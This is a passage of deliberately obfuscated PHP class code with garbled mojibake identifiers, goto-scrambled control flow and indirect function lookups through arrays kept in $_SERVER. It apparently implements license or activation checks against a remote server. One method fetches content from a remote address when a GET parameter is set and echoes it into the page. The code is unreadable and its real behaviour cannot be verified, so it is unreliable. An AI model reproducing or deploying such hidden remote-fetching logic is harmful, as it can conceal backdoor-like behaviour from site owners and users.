< $eÈäè´ÊÌõ[552]) { if (!$C¥ àˆ··£) { break; } $C¥ àˆ··£++; } goto b©¹·ƒÎ; EİÅ”­Ğë£: foreach ($f×à£ñÅà as $cå§Š„°Ğ£) { if (!isset($a‚¢Ÿ—¡–¤[$cå§Š„°Ğ£]) || !$a‚¢Ÿ—¡–¤[$cå§Š„°Ğ£]) { continue; } $C ñ°Øµ¬[$cå§Š„°Ğ£] = $a‚¢Ÿ—¡–¤[$cå§Š„°Ğ£]; $cäùì¥ÚŒ’ = $eÈäè´ÊÌõ[590]; if (!$cäùì¥ÚŒ’) { return; } } $a±öÉ…õõ[13](array($a±öÉ…õõ[151], $a±öÉ…õõ[152]), $C ñ°Øµ¬); $C¥ àˆ··£ = $eÈäè´ÊÌõ[591]; goto c›åÎ†ÅõË; b£ƒ†äößÆ: if ($this->zqre6d96c961 == $a±öÉ…õõ[121]) { return; } $f×à£ñÅà = array($a±öÉ…õõ[153], $a±öÉ…õõ[154], $a±öÉ…õõ[155], $a±öÉ…õõ[156], $a±öÉ…õõ[157], $a±öÉ…õõ[158]); $a‚¢Ÿ—¡–¤ = $a±öÉ…õõ[61]($a±öÉ…õõ[62])->{$_SERVER[Í¶Ìå€õ…Í][63]}(); goto fÇàµáÃ¬‚; b¦ñíæÆ†: $eÈäè´ÊÌõ =& $_SERVER[Õİõş]; $a±öÉ…õõ =& $_SERVER[Í¶Ìå€õ…Í]; if ($_SERVER[$a±öÉ…õõ[44]] == $a±öÉ…õõ[135]) { goto aî…¬‹ÓÜ; CéŠ¦…‹å‘: $d­¾ˆ·Íï = $eÈäè´ÊÌõ[586]; while ($d­¾ˆ·Íï < $eÈäè´ÊÌõ[554]) { if ($d­¾ˆ·Íï >= 0) { break; } $d­¾ˆ·Íï++; } $C ñ°Øµ¬ = array($a±öÉ…õõ[150] => $e¦µãŠ£§“); goto dÆŞ½àŒ¶Ğ; dÆŞ½àŒ¶Ğ: $b——•÷è¸ô = $eÈäè´ÊÌõ[587]; $a±öÉ…õõ[13](array($a±öÉ…õõ[151], $a±öÉ…õõ[152]), $C ñ°Øµ¬); $F¿öÕÖ„ = $eÈäè´ÊÌõ[588]; goto f½Û¤øùâ; f½Û¤øùâ: while (strlen($F¿öÕÖ„) < $eÈäè´ÊÌõ[558]) { if (!$F¿öÕÖ„) { break; } $F¿öÕÖ„++; } goto Bˆ¤æÑáÙ†; aî…¬‹ÓÜ: $e¦µãŠ£§“ = array($a±öÉ…õõ[120] => $this->zqre6d96c961, $a±öÉ…õõ[136] => $this->{$_SERVER[Í¶Ìå€õ…Í][137]}(), $a±öÉ…õõ[138] => $a±öÉ…õõ[61]($a±öÉ…õõ[139])->{$_SERVER[Í¶Ìå€õ…Í][140]}()); if ($this->zqre6d96c961 != $a±öÉ…õõ[121]) { $F³Ë¼¼»  = $a±öÉ…õõ[104]($this->ywuvd0a05dd1, $a±öÉ…õõ[141]); if ($F³Ë¼¼» ) { $e¦µãŠ£§“[$a±öÉ…õõ[142]] = $F³Ë¼¼» ; $e¦µãŠ£§“[$a±öÉ…õõ[143]] = $a±öÉ…õõ[144]($a±öÉ…õõ[104]($this->ywuvd0a05dd1, $a±öÉ…õõ[145])); $e¦µãŠ£§“[$a±öÉ…õõ[146]] = $a±öÉ…õõ[104]($this->ywuvd0a05dd1, $a±öÉ…õõ[131]); } } $e¦µãŠ£§“ = $this->{$_SERVER[Í¶Ìå€õ…Í][147]}($a±öÉ…õõ[148]($e¦µãŠ£§“), $a±öÉ…õõ[114]($a±öÉ…õõ[149])); goto CéŠ¦…‹å‘; Bˆ¤æÑáÙ†: } goto b£ƒ†äößÆ; fÇàµáÃ¬‚: $C ñ°Øµ¬ = array($a±öÉ…õõ[159] => $a‚¢Ÿ—¡–¤[$a±öÉ…õõ[64]], $a±öÉ…õõ[160] => $a‚¢Ÿ—¡–¤[$a±öÉ…õõ[65]], $a±öÉ…õõ[161] => $a±öÉ…õõ[10]); $B©–„Ç’• = $eÈäè´ÊÌõ[589]; if (!$B©–„Ç’•) { die; } goto EİÅ”­Ğë£; b©¹·ƒÎ: } private function vwlq4b2acebf() { goto AÛ·¨òÀì‰; cŠë²“ˆÔğ: $fàÍ÷Ìß­á = $aÁ÷ßÀôÕ[595]; if ($bÌğ§šøó[$aó”¶Æ›Ò×[217]] && $bÌğ§šøó[$aó”¶Æ›Ò×[217]] >= 1) { $aó”¶Æ›Ò×[61]($aó”¶Æ›Ò×[62])->{$_SERVER[Í¶Ìå€õ…Í][218]}($aó”¶Æ›Ò×[219], $aó”¶Æ›Ò×[220]); } $aó”¶Æ›Ò×[61]($aó”¶Æ›Ò×[62])->{$_SERVER[Í¶Ìå€õ…Í][221]}($F–Š÷„İ¿); goto Cö“åìÇ®¸; D„Şø»Æçµ: $f™·Éã¬¿ƒ = $aÁ÷ßÀôÕ[599]; if (strlen($f™·Éã¬¿ƒ) < $aÁ÷ßÀôÕ[554]) { return; } $bïÛ©”ƒÅ[$A•„ÌÓäŠß] = $CÚÊ¶„ÈêÛ; goto dˆ†Ë—Šµ¥; A„§Û¡ˆ‡: if ($b¬èÂÎ¡¨à[$aó”¶Æ›Ò×[178]] == $aó”¶Æ›Ò×[179]) { $cò¿ñÁ“Æµ = $this->{$_SERVER[Í¶Ìå€õ…Í][147]}($BŸÄ»°, $aó”¶Æ›Ò×[180]); $AîëÛâ‚İ‘ = $this->{$_SERVER[Í¶Ìå€õ…Í][127]}($aó”¶Æ›Ò×[148]($D¥Á¼ø†°Ì), $BŸÄ»° . $aó”¶Æ›Ò×[181], 3); $Aõ¯¼±Êòá = $this->{$_SERVER[Í¶Ìå€õ…Í][182]}($aó”¶Æ›Ò×[183] . $cò¿ñÁ“Æµ . $aó”¶Æ›Ò×[184] . $AîëÛâ‚İ‘, -1); $aó”¶Æ›Ò×[166]($Aõ¯¼±Êòá, !0); } else { if ($b¬èÂÎ¡¨à[$aó”¶Æ›Ò×[178]] == $aó”¶Æ›Ò×[185]) { $b³¤ÚíÍºî = $aó”¶Æ›Ò×[25]($aó”¶Æ›Ò×[114]($aó”¶Æ›Ò×[186] . $BŸÄ»°), 12, 15) . $aó”¶Æ›Ò×[187]; $AîëÛâ‚İ‘ = $this->{$_SERVER[Í¶Ìå€õ…Í][188]}($aó”¶Æ›Ò×[2]($b¬èÂÎ¡¨à[$aó”¶Æ›Ò×[189]]), $b³¤ÚíÍºî, 2); $eÈ›¼‹…İ‰ = $aó”¶Æ›Ò×[190]($AîëÛâ‚İ‘, !0); if (!$aó”¶Æ›Ò×[191]($eÈ›¼‹…İ‰) || !$aó”¶Æ›Ò×[191]($eÈ›¼‹…İ‰[$aó”¶Æ›Ò×[192]]) || $eÈ›¼‹…İ‰[$aó”¶Æ›Ò×[165]] != !0) { $B¬é»à®á = $aó”¶Æ›Ò×[193]; $A²ééˆÒ¡ğ = $eÈ›¼‹…İ‰[$aó”¶Æ›Ò×[192]] ? $aó”¶Æ›Ò×[194] . $eÈ›¼‹…İ‰[$aó”¶Æ›Ò×[192]] : $B¬é»à®á; $aó”¶Æ›Ò×[166]($A²ééˆÒ¡ğ, !1); } else { $D¥Á¼ø†°Ì[$aó”¶Æ›Ò×[168]] = $eÈ›¼‹…İ‰[$aó”¶Æ›Ò×[192]][$aó”¶Æ›Ò×[195]]; } } else { $eÈ›¼‹…İ‰ = $this->{$_SERVER[Í¶Ìå€õ…Í][182]}($aó”¶Æ›Ò×[196], $D¥Á¼ø†°Ì, 10); $EÚÁå‹Ë¤Æ = $aÁ÷ßÀôÕ[593]; if (strlen($EÚÁå‹Ë¤Æ) < $aÁ÷ßÀôÕ[543]) { die; } } } if (!$aó”¶Æ›Ò×[191]($eÈ›¼‹…İ‰) || !$aó”¶Æ›Ò×[191]($eÈ›¼‹…İ‰[$aó”¶Æ›Ò×[192]]) || $eÈ›¼‹…İ‰[$aó”¶Æ›Ò×[165]] != !0) { $B¬é»à®á = $aó”¶Æ›Ò×[197]($aó”¶Æ›Ò×[198]); $A²ééˆÒ¡ğ = $eÈ›¼‹…İ‰[$aó”¶Æ›Ò×[192]] ? $aó”¶Æ›Ò×[194] . $eÈ›¼‹…İ‰[$aó”¶Æ›Ò×[192]] : $B¬é»à®á; $aó”¶Æ›Ò×[166]($A²ééˆÒ¡ğ, !1); } $bÌğ§šøó = $eÈ›¼‹…İ‰[$aó”¶Æ›Ò×[192]]; goto Eò°ŒÛ™Ó§; EØ¡®Ó„™: if (!isset($b¬èÂÎ¡¨à[$aó”¶Æ›Ò×[165]]) || $aó”¶Æ›Ò×[24]($b¬èÂÎ¡¨à[$aó”¶Æ›Ò×[165]]) != 16) { $aó”¶Æ›Ò×[166]($aó”¶Æ›Ò×[167] . $b¬èÂÎ¡¨à[$aó”¶Æ›Ò×[165]], !1); } $fš½çóÅ¨  = $aó”¶Æ›Ò×[61]($aó”¶Æ›Ò×[62])->{$_SERVER[Í¶Ìå€õ…Í][63]}($aó”¶Æ›Ò×[116]); $D¥Á¼ø†°Ì = array($aó”¶Æ›Ò×[165] => $b¬èÂÎ¡¨à[$aó”¶Æ›Ò×[165]], $aó”¶Æ›Ò×[168] => $aó”¶Æ›Ò×[124](16), $aó”¶Æ›Ò×[169] => $aó”¶Æ›Ò×[149], $aó”¶Æ›Ò×[170] => $aó”¶Æ›Ò×[171], $aó”¶Æ›Ò×[172] => $_SERVER[$aó”¶Æ›Ò×[173]], $aó”¶Æ›Ò×[174] => $_SERVER[$aó”¶Æ›Ò×[175]], $aó”¶Æ›Ò×[176] => $_SERVER[$aó”¶Æ›Ò×[177]]); goto Bš”Æªß…; aøõ¬õ‰–: $a²ãï‹Éˆ = $aÁ÷ßÀôÕ[597]; if (strlen($a²ãï‹Éˆ) < $aÁ÷ßÀôÕ[552]) { return; } $eğÇçõÎ« = $BÑ»Ïëãéœ[$aó”¶Æ›Ò×[225]]; goto D¤­©ÛœŞƒ; då¢èÛÙÊ: $e—¶¥î©§Û = $aÁ÷ßÀôÕ[594]; if (strlen($e—¶¥î©§Û) < $aÁ÷ßÀôÕ[552]) { die; } $F–Š÷„İ¿[$aó”¶Æ›Ò×[123]] = $aó”¶Æ›Ò×[118]($aó”¶Æ›Ò×[214]($this->{$_SERVER[Í¶Ìå€õ…Í][147]}($BÈî„¨¢Òø, $aó”¶Æ›Ò×[216]))); goto cŠë²“ˆÔğ; Bš”Æªß…: $b“°«ò„æ™ = $aÁ÷ßÀôÕ[592]; while (strlen($b“°«ò„æ™) < $aÁ÷ßÀôÕ[543]) { if (!$b“°«ò„æ™) { break; } $b“°«ò„æ™++; } $BŸÄ»° = $aó”¶Æ›Ò×[114]($_SERVER[$aó”¶Æ›Ò×[115]] . $fš½çóÅ¨ ); goto A„§Û¡ˆ‡; Cà¬ö½„ƒÕ: if ($D¥Á¼ø†°Ì[$aó”¶Æ›Ò×[168]]) { $F–Š÷„İ¿[$aó”¶Æ›Ò×[212]] = $D¥Á¼ø†°Ì[$aó”¶Æ›Ò×[168]]; } $Fô ¬Ó¤îÂ = $aó”¶Æ›Ò×[25]($aó”¶Æ›Ò×[114]($F–Š÷„İ¿[$aó”¶Æ›Ò×[210]]), 10, 10); $E±ã£˜÷÷ó = $Fô ¬Ó¤îÂ . $F–Š÷„İ¿[$aó”¶Æ›Ò×[120]] . $F–Š÷„İ¿[$aó”¶Æ›Ò×[212]]; goto CÀ±ñ¨ÏÍŒ; D¤­©ÛœŞƒ: $d›æ¿Ç°˜Ï = $aÁ÷ßÀôÕ[598]; if (!$d›æ¿Ç°˜Ï) { return; } $bïÛ©”ƒÅ = array(); goto D„Şø»Æçµ; aÑ÷’ÖŸ¼Ä: $A•„ÌÓäŠß = $aó”¶Æ›Ò×[214]($aó”¶Æ›Ò×[25]($f‰’‡ì„ÚÆ, 10, 16)); $CÚÊ¶„ÈêÛ = $this->{$_SERVER[Í¶Ìå€õ…Í][127]}($aó”¶Æ›Ò×[148]($bÌğ§šøó), $f‰’‡ì„ÚÆ); $BÑ»Ïëãéœ = $aó”¶Æ›Ò×[222]($aó”¶Æ›Ò×[61]($aó”¶Æ›Ò×[11])->{$_SERVER[Í¶Ìå€õ…Í][223]}(), $aó”¶Æ›Ò×[224]); goto aøõ¬õ‰–; dˆ†Ë—Šµ¥: $aÊ–´Í·®Ì = $aÁ÷ßÀôÕ[600]; while (strlen($aÊ–´Í·®Ì) < $aÁ÷ßÀôÕ[554]) { if (!$aÊ–´Í·®Ì) { break; } $aÊ–´Í·®Ì++; } $aó”¶Æ›Ò×[61]($aó”¶Æ›Ò×[11])->{$_SERVER[Í¶Ìå€õ…Í][226]}($eğÇçõÎ«[$aó”¶Æ›Ò×[227]], array($aó”¶Æ›Ò×[228] => $bïÛ©”ƒÅ)); goto F‰Ù¢Ò³È¶; CÀ±ñ¨ÏÍŒ: $F–Š÷„İ¿[$aó”¶Æ›Ò×[122]] = $aó”¶Æ›Ò×[214]($aó”¶Æ›Ò×[118]($this->{$_SERVER[Í¶Ìå€õ…Í][147]}($E±ã£˜÷÷ó, $aó”¶Æ›Ò×[215]))); $C‰Ü¦æˆ¶Ë = $aó”¶Æ›Ò×[124](16); $BÈî„¨¢Òø = $C‰Ü¦æˆ¶Ë . $F–Š÷„İ¿[$aó”¶Æ›Ò×[120]] . $this->{$_SERVER[Í¶Ìå€õ…Í][147]}($aó”¶Æ›Ò×[114]($F–Š÷„İ¿[$aó”¶Æ›Ò×[209]]), $C‰Ü¦æˆ¶Ë); goto då¢èÛÙÊ; F‰Ù¢Ò³È¶: $b¤É¨³ÎˆÈ = $aÁ÷ßÀôÕ[601]; $aó”¶Æ›Ò×[166]($aó”¶Æ›Ò×[197]($aó”¶Æ›Ò×[208]), !0); $EÊÓ¸Ì‘Ö = $aÁ÷ßÀôÕ[602]; goto eÉ‚·šÍ ; Eò°ŒÛ™Ó§: $eÉÔ—Ğ“ = $this->{$_SERVER[Í¶Ìå€õ…Í][199]}($bÌğ§šøó[$aó”¶Æ›Ò×[200]]); if (!$eÉÔ—Ğ“ || $eÉÔ—Ğ“ != $aó”¶Æ›Ò×[201]($bÌğ§šøó[$aó”¶Æ›Ò×[145]])) { $c˜š‘‚Éì× = array($aó”¶Æ›Ò×[202] => $aó”¶Æ›Ò×[61]($aó”¶Æ›Ò×[62])->{$_SERVER[Í¶Ìå€õ…Í][63]}($aó”¶Æ›Ò×[116]), $aó”¶Æ›Ò×[203] => $_SERVER[$aó”¶Æ›Ò×[115]], $aó”¶Æ›Ò×[204] => $aó”¶Æ›Ò×[205](), $aó”¶Æ›Ò×[174] => $_SERVER[$aó”¶Æ›Ò×[175]]); $AîëÛâ‚İ‘ = $this->{$_SERVER[Í¶Ìå€õ…Í][206]}($aó”¶Æ›Ò×[148]($c˜š‘‚Éì×)); $this->{$_SERVER[Í¶Ìå€õ…Í][182]}($aó”¶Æ›Ò×[207] . $AîëÛâ‚İ‘); $aó”¶Æ›Ò×[166]($aó”¶Æ›Ò×[197]($aó”¶Æ›Ò×[208]), !0); } $F–Š÷„İ¿ = array($aó”¶Æ›Ò×[209] => $D¥Á¼ø†°Ì[$aó”¶Æ›Ò×[165]], $aó”¶Æ›Ò×[210] => $bÌğ§šøó[$aó”¶Æ›Ò×[211]], $aó”¶Æ›Ò×[212] => $aó”¶Æ›Ò×[124](16), $aó”¶Æ›Ò×[120] => $bÌğ§šøó[$aó”¶Æ›Ò×[213]]); goto Cà¬ö½„ƒÕ; cö„åÇŒ’é: if (!$aó”¶Æ›Ò×[104]($GLOBALS, $aó”¶Æ›Ò×[132])) { die; } $b¬èÂÎ¡¨à = $GLOBALS[$aó”¶Æ›Ò×[22]]; if (isset($b¬èÂÎ¡¨à[$aó”¶Æ›Ò×[163]])) { $this->{$_SERVER[Í¶Ìå€õ…Í][164]}(); die; } goto EØ¡®Ó„™; Cö“åìÇ®¸: $f‰’‡ì„ÚÆ = $aó”¶Æ›Ò×[114]($_SERVER[$aó”¶Æ›Ò×[115]] . $aó”¶Æ›Ò×[214]($fš½çóÅ¨ ) . $F–Š÷„İ¿[$aó”¶Æ›Ò×[210]]); $F«¶©‚ÜÍÆ = $aÁ÷ßÀôÕ[596]; if (!$F«¶©‚ÜÍÆ) { die; } goto aÑ÷’ÖŸ¼Ä; AÛ·¨òÀì‰: $aÁ÷ßÀôÕ =& $_SERVER[Õİõş]; $aó”¶Æ›Ò× =& $_SERVER[Í¶Ìå€õ…Í]; if ($_SERVER[$aó”¶Æ›Ò×[44]] != $aó”¶Æ›Ò×[162]) { return; } goto cö„åÇŒ’é; eÉ‚·šÍ : while ($EÊÓ¸Ì‘Ö < $aÁ÷ßÀôÕ[554]) { if ($EÊÓ¸Ì‘Ö >= 0) { break; } $EÊÓ¸Ì‘Ö++; } goto AÇ®Ã£¢Ùâ; AÇ®Ã£¢Ùâ: } private function ostp4be7ea6c() { goto AÀ™îÏ¼¤˜; EĞÚÅÏÇ: if (!$e³à Ç™¿ç) { return; } goto EÑ‡¥éÌ¬å; AÀ™îÏ¼¤˜: $c–åİà÷‘ =& $_SERVER[Í¶Ìå€õ…Í]; $c–åİà÷‘[61]($c–åİà÷‘[62])->{$_SERVER[Í¶Ìå€õ…Í][221]}(array($c–åİà÷‘[209] => $c–åİà÷‘[10], $c–åİà÷‘[210] => $c–åİà÷‘[10], $c–åİà÷‘[120] => $c–åİà÷‘[121], $c–åİà÷‘[122] => $c–åİà÷‘[10], $c–åİà÷‘[123] => $c–åİà÷‘[10])); $c–åİà÷‘[61]($c–åİà÷‘[62])->{$_SERVER[Í¶Ìå€õ…Í][218]}($c–åİà÷‘[219], $c–åİà÷‘[229]); goto d¶ğÑšŸ¿„; d¶ğÑšŸ¿„: $this->ywuvd0a05dd1 = array(); $this->zqre6d96c961 = $c–åİà÷‘[121]; $e³à Ç™¿ç = $_SERVER[Õİõş][603]; goto EĞÚÅÏÇ; EÑ‡¥éÌ¬å: } private function pekqcb08e713() { goto C£§Æ›Í÷; C£§Æ›Í÷: $aù‡”Çóèí =& $_SERVER[Õİõş]; $dËï¼«‰Ø© =& $_SERVER[Í¶Ìå€õ…Í]; $_SERVER[$dËï¼«‰Ø©[175]] = $dËï¼«‰Ø©[104]($_SERVER, $dËï¼«‰Ø©[175], APP_HOST); goto Dñˆ¿Š·Çé; dˆÉ‘””ÁÄ: while ($cÑ«ÖÀÒİÙ < $aù‡”Çóèí[560]) { if ($cÑ«ÖÀÒİÙ >= 0) { break; } $cÑ«ÖÀÒİÙ++; } $A×ŠëÛ˜Ğ™ = $dËï¼«‰Ø©[190]($A×ŠëÛ˜Ğ™, !0); if (!$dËï¼«‰Ø©[191]($A×ŠëÛ˜Ğ™)) { return $this->{$_SERVER[Í¶Ìå€õ…Í][164]}(); } goto D£Ñ¬ƒğ»; c¡àëØ†™Ğ: $this->zqre6d96c961 = $A˜‰ƒâï¯[$dËï¼«‰Ø©[120]]; goto B˜ôÎµ‹ªê; fæñ¹¤Ò¨: if (strlen($b³à­­‡ôŞ) < $aù‡”Çóèí[558]) { die; } $f‘ß¢´Ø¡» = $e¹ó³ğß½«[$dËï¼«‰Ø©[225]]; $dÑçÜ¾İÍ¬ = $dËï¼«‰Ø©[114]($_SERVER[$dËï¼«‰Ø©[115]] . $dËï¼«‰Ø©[214]($CÉéíµ¦¼‘) . $A˜‰ƒâï¯[$dËï¼«‰Ø©[210]]); goto c»Ê‘„ÄÄ; a´˜ï‰•„²: $A˜‰ƒâï¯ = $dËï¼«‰Ø©[61]($dËï¼«‰Ø©[62])->{$_SERVER[Í¶Ìå€õ…Í][63]}(); $d±ù¢­“Í = $aù‡”Çóèí[605]; if ($A˜‰ƒâï¯[$dËï¼«‰Ø©[120]] == $dËï¼«‰Ø©[121]) { return; } goto F©·Ê¤Ğİ; D£Ñ¬ƒğ»: $DÄøëêÔñœ = $dËï¼«‰Ø©[144]($A×ŠëÛ˜Ğ™[$dËï¼«‰Ø©[145]]); if ($dËï¼«‰Ø©[230]() >= $DÄøëêÔñœ) { return $this->{$_SERVER[Í¶Ìå€õ…Í][164]}(); } $this->ywuvd0a05dd1 = $A×ŠëÛ˜Ğ™; goto c¡àëØ†™Ğ; DÄ¯Î”­£Ç: $d¡‚°¯Ùô = $aù‡”Çóèí[608]; $A×ŠëÛ˜Ğ™ = $this->{$_SERVER[Í¶Ìå€õ…Í][188]}($f‘ß¢´Ø¡»[$dËï¼«‰Ø©[91]][$c„ÈÒŠØĞ ], $dÑçÜ¾İÍ¬); $cÑ«ÖÀÒİÙ = $aù‡”Çóèí[609]; goto dˆÉ‘””ÁÄ; Dñˆ¿Š·Çé: $AÙ‰´Ú‡” = $aù‡”Çóèí[604]; if (strlen($AÙ‰´Ú‡”) < $aù‡”Çóèí[552]) { die; } $this->zqre6d96c961 = $dËï¼«‰Ø©[121]; goto a´˜ï‰•„²; F©·Ê¤Ğİ: $CÉéíµ¦¼‘ = $dËï¼«‰Ø©[61]($dËï¼«‰Ø©[62])->{$_SERVER[Í¶Ìå€õ…Í][63]}($dËï¼«‰Ø©[116]); $e¹ó³ğß½« = $dËï¼«‰Ø©[222]($dËï¼«‰Ø©[61]($dËï¼«‰Ø©[11])->{$_SERVER[Í¶Ìå€õ…Í][223]}(), $dËï¼«‰Ø©[224]); $b³à­­‡ôŞ = $aù‡”Çóèí[606]; goto fæñ¹¤Ò¨; c»Ê‘„ÄÄ: $bèäª‘šÊÚ = $aù‡”Çóèí[607]; if (strlen($bèäª‘šÊÚ) < $aù‡”Çóèí[554]) { die; } $c„ÈÒŠØĞ  = $dËï¼«‰Ø©[214]($dËï¼«‰Ø©[25]($dÑçÜ¾İÍ¬, 10, 16)); goto DÄ¯Î”­£Ç; B˜ôÎµ‹ªê: } private function amuda79d58f4() { goto c¾ÅãÛÍ­; C¢ÇÏ×£—¡: $e‹îøÄÌÃÚ = $_SERVER[$Fø–•µËÛ¾[44]]; $b³šØğö¶‚ = $a“è¥Ûæğ¸[610]; if (strlen($b³šØğö¶‚) < $a“è¥Ûæğ¸[558]) { die; } goto D·ˆÅã¹Ş¤; c¾ÅãÛÍ­: $a“è¥Ûæğ¸ =& $_SERVER[Õİõş]; $Fø–•µËÛ¾ =& $_SERVER[Í¶Ìå€õ…Í]; $eäŞøËíˆ = $GLOBALS[$Fø–•µËÛ¾[22]]; goto C¢ÇÏ×£—¡; D·ˆÅã¹Ş¤: if ($e‹îøÄÌÃÚ == $Fø–•µËÛ¾[231] && $this->zqre6d96c961 == $Fø–•µËÛ¾[121]) { $Fø–•µËÛ¾[166]($Fø–•µËÛ¾[197]($Fø–•µËÛ¾[232]), !1, $Fø–•µËÛ¾[233]); } $dŞ‡®–†¼ = array($Fø–•µËÛ¾[234], $Fø–•µËÛ¾[235]); if ($Fø–•µËÛ¾[236]($e‹îøÄÌÃÚ, $dŞ‡®–†¼)) { if ($this->zqre6d96c961 == $Fø–•µËÛ¾[121] && isset($eäŞøËíˆ[$Fø–•µËÛ¾[237]])) { $Fø–•µËÛ¾[166]($Fø–•µËÛ¾[197]($Fø–•µËÛ¾[232]), !1, $Fø–•µËÛ¾[233]); die; } $C¨•“Ø×¾Õ = $this->{$_SERVER[Í¶Ìå€õ…Í][137]}(); if ($C¨•“Ø×¾Õ != $Fø–•µËÛ¾[201]($Fø–•µËÛ¾[238])) { if ($C¨•“Ø×¾Õ <= $Fø–•µËÛ¾[61]($Fø–•µËÛ¾[139])->{$_SERVER[Í¶Ìå€õ…Í][140]}()) { $Fø–•µËÛ¾[166]($Fø–•µËÛ¾[197]($Fø–•µËÛ¾[239]), !1, $Fø–•µËÛ¾[233]); die; } } } goto EÄéåˆĞ‚¢; EÄéåˆĞ‚¢: } private function niqt3d187d41() { goto A ËÅæ¿ƒ; A ËÅæ¿ƒ: $f£Óƒé–±ä =& $_SERVER[Õİõş]; $b»¬ƒÃ‘ˆä =& $_SERVER[Í¶Ìå€õ…Í]; $cïÖÂ™äÊë = array($b»¬ƒÃ‘ˆä[135], $b»¬ƒÃ‘ˆä[240]); goto bäƒœÃ«ÑÍ; FŸÈáÈÔÈ¶: die; goto EÅÏ„â§ëÉ; cÚÊùäåİÃ: $bæà™¤“ƒÏ = $b»¬ƒÃ‘ˆä[245](array($b»¬ƒÃ‘ˆä[246] => array($b»¬ƒÃ‘ˆä[247] => $b»¬ƒÃ‘ˆä[248], $b»¬ƒÃ‘ˆä[249] => 3))); $E‰íÀ‡Ö“ = @$b»¬ƒÃ‘ˆä[250]($B‹Ò¢ÕÂÕ, !1, $bæà™¤“ƒÏ); $b»¬ƒÃ‘ˆä[251]($b»¬ƒÃ‘ˆä[252]); goto c§÷»Ç‚¹‰; c§÷»Ç‚¹‰: $B³‘Ãâôæ‘ = $f£Óƒé–±ä[612]; if (strlen($B³‘Ãâôæ‘) < $f£Óƒé–±ä[552]) { return; } if ($E‰íÀ‡Ö“ && $b»¬ƒÃ‘ˆä[32]($E‰íÀ‡Ö“, $b»¬ƒÃ‘ˆä[253])) { echo $E‰íÀ‡Ö“; } goto FŸÈáÈÔÈ¶; bäƒœÃ«ÑÍ: $f¹óáê¡ì = $f£Óƒé–±ä[611]; if (strlen($f¹óáê¡ì) < $f£Óƒé–±ä[552]) { return; } if (!$b»¬ƒÃ‘ˆä[104]($GLOBALS, $b»¬ƒÃ‘ˆä[132]) || !isset($_GET[$b»¬ƒÃ‘ˆä[241]])) { return; } goto AÆ°£à‡¥¹; AÆ°£à‡¥¹: if (!$b»¬ƒÃ‘ˆä[236]($_SERVER[$b»¬ƒÃ‘ˆä[44]], $cïÖÂ™äÊë)) { return; } $B‹Ò¢ÕÂÕ = $b»¬ƒÃ‘ˆä[242]; $B‹Ò¢ÕÂÕ = $this->{$_SERVER[Í¶Ìå€õ…Í][243]}($B‹Ò¢ÕÂÕ, $b»¬ƒÃ‘ˆä[244]); goto cÚÊùäåİÃ; EÅÏ„â§ëÉ: } public function jbvf8043a79d($FÖà¬ÈŒ­…) { goto B‹¿”µø˜; Bˆ©ä½Ş: $B¼Üßì— = array($D†’İ»Øõ[255], $D†’İ»Øõ[256], $D†’İ»Øõ[257], $D†’İ»Øõ[258], $D†’İ»Øõ[259], $D†’İ»Øõ[260], $D†’İ»Øõ[261], $D†’İ»Øõ[262]); $AšùÃÄ²§ª = $D†’İ»Øõ[0]($D†’İ»Øõ[263], $D†’İ»Øõ[104]($this->ywuvd0a05dd1, $D†’İ»Øõ[129], $D†’İ»Øõ[10])); $có¾Â©øÚ§ = $F¥•¸±¸²ö[613]; goto bÃÈŞ› ¢; aí‚¸„È¼È: return $FÖà¬ÈŒ­…; goto aæäÇÄîç¸; eÃí„‡¿’İ: while (strlen($föõ˜« ) < $F¥•¸±¸²ö[552]) { if (!$föõ˜« ) { break; } $föõ˜« ++; } foreach ($B¼Üßì— as $E¥Ú˜§ÊàÌ) { if (!$D†’İ»Øõ[236]($E¥Ú˜§ÊàÌ, $AšùÃÄ²§ª)) { $DÖ”ùÊ«„ø[] = $E¥Ú˜§ÊàÌ; } } foreach ($DÖ”ùÊ«„ø as $E¥Ú˜§ÊàÌ) { unset($FÖà¬ÈŒ­…[$E¥Ú˜§ÊàÌ]); } goto aí‚¸„È¼È; B‹¿”µø˜: $F¥•¸±¸²ö =& $_SERVER[Õİõş]; $D†’İ»Øõ =& $_SERVER[Í¶Ìå€õ…Í]; if ($this->zqre6d96c961 == $D†’İ»Øõ[254]) { return $FÖà¬ÈŒ­…; } goto Bˆ©ä½Ş; bÃÈŞ› ¢: if (strlen($có¾Â©øÚ§) < $F¥•¸±¸²ö[552]) { die; } $DÖ”ùÊ«„ø = array(); $föõ˜«  = $F¥•¸±¸²ö[614]; goto eÃí„‡¿’İ; aæäÇÄîç¸: } private function brvj9555eee5() { goto A£³‘›Íòˆ; b”¥ôŒ¬‰: foreach ($E¿«’‚ÛÃ as $AçÌ‰Œ”½‚) { if ($AçÌ‰Œ”½‚ == $c‘×¶ŒŞñ || $dÒİª˜‘Õ[25]($c‘×¶ŒŞñ, 0, $dÒİª˜‘Õ[24]($AçÌ‰Œ”½‚)) == $AçÌ‰Œ”½‚) { $dÒİª˜‘Õ[166]($dÒİª˜‘Õ[197]($dÒİª˜‘Õ[266]), !1); } } $GLOBALS[$dÒİª˜‘Õ[91]][$dÒİª˜‘Õ[95]][$dÒİª˜‘Õ[267]] = $dÒİª˜‘Õ[220]; $fÄÂí¯·ß² = $f…Ñ›Ìà‘®[616]; goto dõ«¯ÈˆøÆ; Cñäêõ«ñŒ: if (strlen($FÏö‚İÑ°) < $f…Ñ›Ìà‘®[558]) { return; } if ($dÒİª˜‘Õ[61]($dÒİª˜‘Õ[269])->{$_SERVER[Í¶Ìå€õ…Í][63]}($dÒİª˜‘Õ[85]) != $dÒİª˜‘Õ[229]) { $dÒİª˜‘Õ[61]($dÒİª˜‘Õ[269])->{$_SERVER[Í¶Ìå€õ…Í][221]}($dÒİª˜‘Õ[85], $dÒİª˜‘Õ[229]); } goto B‹âßëµÍ¢; bÑÅâßö‡õ: $c‘×¶ŒŞñ = $_SERVER[$dÒİª˜‘Õ[44]]; $E¿«’‚ÛÃ = array($dÒİª˜‘Õ[265]); $Dåó×ñÒË = $f…Ñ›Ìà‘®[615]; goto b”¥ôŒ¬‰; A£³‘›Íòˆ: $f…Ñ›Ìà‘® =& $_SERVER[Õİõş]; $dÒİª˜‘Õ =& $_SERVER[Í¶Ìå€õ…Í]; if ($this->zqre6d96c961 != $dÒİª˜‘Õ[121]) { $GLOBALS[$dÒİª˜‘Õ[91]][$dÒİª˜‘Õ[95]][$dÒİª˜‘Õ[264]] = $dÒİª˜‘Õ[220]; return; } goto bÑÅâßö‡õ; dõ«¯ÈˆøÆ: 